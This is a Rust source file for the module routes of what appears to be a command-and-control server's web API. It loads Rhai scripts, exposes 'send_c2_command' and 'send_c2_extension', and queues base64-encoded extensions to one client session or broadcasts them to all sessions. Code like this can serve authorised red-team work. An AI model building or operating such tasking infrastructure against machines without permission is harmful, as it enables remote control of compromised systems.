// src/api/routes/modules.rs
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json,
};
use std::sync::Arc;
use std::fs;
use rhai::{Engine, Scope, Dynamic};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::api::state::ApiContext;
use crate::api::models::{BroadcastModuleRequest, ExtensionPayload};
use crate::common::SharedSessions;
use crate::database;

// --- Helpers ---
fn script_send_command(sessions: SharedSessions, session_id: u32, command: String) -> String {
    let sessions_lock = sessions.lock().unwrap();
    if let Some(session) = sessions_lock.get(&session_id) {
        let _ = session.tx.send((command, None));
        return "Queued".to_string();
    }
    "Session Not Found".to_string()
}

fn script_send_extension(sessions: SharedSessions, session_id: u32, ext_name: String, args: Vec<String>) -> String {
    let sessions_lock = sessions.lock().unwrap();
    if let Some(session) = sessions_lock.get(&session_id) {
        let filepath = format!("./modules/{}.rhai", ext_name);
        let content = match fs::read_to_string(&filepath) {
            Ok(c) => c,
            Err(e) => return format!("Error reading extension '{}': {}", ext_name, e),
        };

        let b64_script = BASE64.encode(content);
        let mut command = format!("ext:load {}", b64_script);
        for arg in args {
            command.push(' ');
            command.push_str(&arg);
        }

        let _ = session.tx.send((command, None));
        return format!("Queued extension '{}'", ext_name);
    }
    "Session Not Found".to_string()
}

// --- Handlers ---

pub async fn list_modules(State(_): State<Arc<ApiContext>>) -> Json<Vec<String>> {
    let mut modules = Vec::new();
    if let Ok(entries) = fs::read_dir("./modules") { 
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_file() {
                    if let Some(name) = entry.file_name().to_str() {
                        if name.ends_with(".rhai") {
                            modules.push(name.trim_end_matches(".rhai").to_string());
                        }
                    }
                }
            }
        }
    }
    Json(modules)
}

pub async fn execute_module(
    State(state): State<Arc<ApiContext>>,
    Path((id, module_name)): Path<(u32, String)>,
) -> Response {
    if module_name.contains("..") || module_name.contains("/") {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid module name"}))).into_response();
    }

    let filename = format!("./modules/{}.rhai", module_name);
    let mut engine = Engine::new();
    
    let sessions_clone = state.sessions.clone();
    engine.register_fn("send_c2_command", move |sess_id: i64, cmd: &str| {
        script_send_command(sessions_clone.clone(), sess_id as u32, cmd.to_string())
    });

    let sessions_clone_ext = state.sessions.clone();
    engine.register_fn("send_c2_extension", move |sess_id: i64, ext_name: &str, args: Vec<Dynamic>| {
        let string_args: Vec<String> = args.iter().map(|d| d.to_string()).collect();
        script_send_extension(sessions_clone_ext.clone(), sess_id as u32, ext_name.to_string(), string_args)
    });

    let ast = match engine.compile_file(filename.clone().into()) {
        Ok(ast) => ast,
        Err(e) => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": format!("Load error: {}", e)}))).into_response(),
    };

    let mut scope = Scope::new();
    match engine.call_fn::<String>(&mut scope, &ast, "run", (id as i64,)) {
        Ok(result) => (StatusCode::OK, Json(serde_json::json!({ "module": module_name, "status": "executed", "result": result }))).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": format!("Runtime Error: {}", e) }))).into_response(),
    }
}

pub async fn deploy_extension(
    State(state): State<Arc<ApiContext>>,
    Path((id, filename)): Path<(u32, String)>,
    payload: Option<Json<ExtensionPayload>>, 
) -> Response {
    if filename.contains("..") || filename.contains("/") || filename.contains("\\") {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid filename"}))).into_response();
    }

    let filepath = format!("./modules/{}.rhai", filename);

    let script_content = match fs::read_to_string(&filepath) {
        Ok(c) => c,
        Err(_) => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Extension not found on server"}))).into_response(),
    };

    let b64_script = BASE64.encode(script_content);
    let mut command_str = format!("ext:load {}", b64_script);
    
    if let Some(Json(p)) = payload {
        for arg in p.args {
            if !arg.contains(' ') {
                command_str.push_str(" ");
                command_str.push_str(&arg);
            }
        }
    }

    let sessions = state.sessions.lock().unwrap();
    if let Some(session) = sessions.get(&id) {
        let _ = session.tx.send((command_str, None));
        return (StatusCode::OK, Json(serde_json::json!({
            "status": "queued",
            "message": format!("Extension '{}' sent to Client #{}", filename, id)
        }))).into_response();
    }

    (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session offline"}))).into_response()
}

pub async fn broadcast_module(
    State(state): State<Arc<ApiContext>>,
    Json(payload): Json<BroadcastModuleRequest>,
) -> Response {
    if payload.module_name.contains("..") || payload.module_name.contains("/") || payload.module_name.contains("\\") {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid module name"}))).into_response();
    }

    let filepath = format!("./modules/{}.rhai", payload.module_name);
    let script_content = match fs::read_to_string(&filepath) {
        Ok(c) => c,
        Err(_) => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Module not found on server"}))).into_response(),
    };

    let b64_script = BASE64.encode(script_content);
    let mut command_str = format!("ext:load {}", b64_script);
    for arg in payload.args {
        if !arg.contains(' ') {
            command_str.push_str(" ");
            command_str.push_str(&arg);
        }
    }

    let sessions = state.sessions.lock().unwrap();
    let mut count = 0;
    
    let db_inner = state.db.clone();
    let cmd_log = command_str.clone();
    let active_ids: Vec<u32> = sessions.keys().cloned().collect();

    tokio::task::spawn_blocking(move || {
        // [UPDATED] Use pool
        if let Ok(conn) = db_inner.get() {
            for id in active_ids {
                let req_id = rand::random::<u64>(); 
                database::log_command(&conn, id, req_id, &cmd_log);
            }
        }
    });

    for session in sessions.values() {
        if session.tx.send((command_str.clone(), None)).is_ok() { count += 1; }
    }

    (StatusCode::OK, Json(serde_json::json!({ 
        "status": "broadcast_queued", 
        "module": payload.module_name,
        "targets_reached": count 
    }))).into_response()
}
